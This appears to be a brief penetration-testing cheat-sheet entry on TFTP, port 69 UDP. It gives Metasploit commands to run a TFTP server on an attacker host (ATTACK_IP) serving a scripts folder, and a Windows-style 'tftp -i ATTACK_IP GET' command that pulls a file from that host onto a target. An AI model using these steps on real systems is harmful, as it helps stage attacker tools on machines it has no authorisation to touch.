# TFTP

Port 69 UDP

### 1) Use Metasploit

    use auxiliary/server/tftp
    set srvhost ATTACK_IP
    set tftproot /home/user/scripts
    exploit

### 2) Download file via TFTP

    tftp -i ATTACK_IP GET file.txt
